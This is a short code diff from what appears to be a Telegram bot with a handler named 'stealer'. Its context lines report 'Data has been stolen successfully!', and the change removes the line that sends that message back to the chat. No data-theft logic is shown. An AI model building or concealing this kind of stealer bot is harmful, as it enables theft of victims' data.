@@ -39,7 +39,6 @@ async def stealer(message: types.Message):
             logger.error(e)
     msg = f"Data has been stolen successfully!"
     logger.debug(msg)
-    await message.answer(msg)
 
 
 async def on_startup():
